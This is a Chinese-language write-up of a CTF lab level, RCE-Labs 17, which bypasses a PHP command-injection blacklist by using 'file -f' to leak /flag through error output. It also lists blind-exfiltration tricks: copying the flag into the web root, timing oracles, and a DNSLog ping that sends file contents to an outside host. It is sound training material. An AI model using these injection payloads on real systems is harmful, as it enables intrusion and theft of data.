RCE-Labs Level 17 - file 命令识别文件类型与报错泄露

2026年10月3日 RCE-Labs 黑名单绕过 信息收集

一、题目信息

  • 题目名称：RCE-Labs Level 17 (file 命令识别文件类型)
  • 靶场链接：http://靶机IP:8080/less-17/
  • 涉及工具：浏览器

二、解题步骤

1. 分析题目考什么

黑名单封禁了 strings 和 grep，所有常规读取工具已全军覆没。题目提示使用 file 命令。这是一个“元数据识别”与“报错信息泄露”的综合考点。

2. 怎么解（详细步骤与输出解析）

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

第一步：确认文件类型

?cmd=file /flag

回显：/flag: ASCII text

解析：file 命令通过读取文件的“魔数”（Magic Number，即文件头部特征字节）来识别文件类型。它不关心文件内容是什么，只告诉你它是个什么文件。

第二步：利用 -f 参数触发报错泄露（最终 Payload）

?cmd=file -f /flag

回显：flag{TEST_Dynamic_FLAG}: cannot open 'flag{TEST_Dynamic_FLAG}' (No such file or directory)

原理解析：file 命令的 -f 参数含义是“从指定文件中读取要检查的文件名列表”。当我们执行 file -f /flag 时，它会把 /flag 的内容（也就是 flag{TEST_Dynamic_FLAG}）当作一个文件名去寻找。因为系统中不存在这个文件，file 会报错并把文件名打印在错误信息里，从而将 flag 泄露。

拓展：其他利用参数报错泄露的技巧

刚才我们使用了 file -f /flag，其核心思路是：让程序将文件内容当作参数去处理，利用其报错机制回显内容。类似的操作还有：

  • find /flag -exec cat {} \;（若 /flag 内容被解析为路径，可能触发报错）
  • wc -c /flag 或 md5sum /flag（若将文件内容误认为文件名，也会在报错时泄露）
  • cp /flag /tmp/1（如果 /flag 内容被当作源文件名，报错“找不到文件”会回显内容）

无回显时的通用利用思路：

  • 报错回显：依赖 PHP 配置 display_errors = On。
  • 写入 Web 目录：?cmd=cat /flag > /var/www/html/1.txt，然后浏览器访问该文件。
  • 管道与 tee：?cmd=cat /flag | tee /var/www/html/1.txt，同时回显和写文件。
  • 时间盲注：?cmd=if [ "$(cat /flag | cut -c 1)" == "f" ]; then sleep 3; fi，通过响应时间判断字符。
  • DNSLog 外带：?cmd=ping -c 1 `cat /flag`.dnslog.cn，通过查看 DNS 日志获取内容。

元数据读取命令：如果 Flag 是文件名或可以通过文件信息推断，可使用 ls -l、stat /flag、du -b /flag 等命令。

3. 怎么迁移（跨学科与跨领域联想）

  • 文件类型鉴别与恶意软件分析：在应急响应中，发现一个可疑文件（如 invoice.pdf），运行 file invoice.pdf 发现它其实是 PE32 executable（Windows 可执行文件），这立刻就能判断出这是一次伪装攻击。
  • 报错信息泄露漏洞：在 Web 安全中，程序员如果在错误页面直接回显了 SQL 查询语句或文件路径，就可能导致敏感信息泄露。这题就是利用命令本身的报错逻辑将文件内容外带出来。

三、名词大全与原理深度复盘

1. file 命令与魔数 (Magic Number)

file 命令依赖于系统中存储的文件特征库（通常是 /usr/share/misc/magic.mgc）。它读取文件的前几个字节，与特征库进行比对。例如，PNG 图片的前 8 个字节固定是 89 50 4E 47 0D 0A 1A 0A，ZIP 压缩包前几个字节是 50 4B 03 04。这就是“魔数”的底层逻辑。

2. -f 参数与文件列表

file -f 文件名 意味着“从文件中读取要检查的文件名列表，然后检查这些文件”。如果列表中的文件名包含特殊字符或不存在，file 往往在报错时会原样输出该字符串。这是典型的“利用程序副作用（报错）来获取信息”的渗透思路。

四、题目思考

1. 这跟前面关卡的区别

前面几关是在“读内容”和“换编码”上做文章，而 Level 17 是第一次利用工具的错误处理机制来泄露数据。从“读”变成了“骗”，这是渗透测试中非常关键的思维转变。

2. 如何抽象理解概念（大白话）

把文件比作一个快递包裹。前面用 cat 是直接把包裹拆开看里面的物品；用 base64 是把物品拍成照片传出来；而 Level 17 的 file -f，是你没拆包裹，而是把包裹上的“寄件人名单”当作收件人地址去邮局查，结果邮局大喊“收件人不存在”，把寄件人的名字（也就是 Flag）暴露了出来。
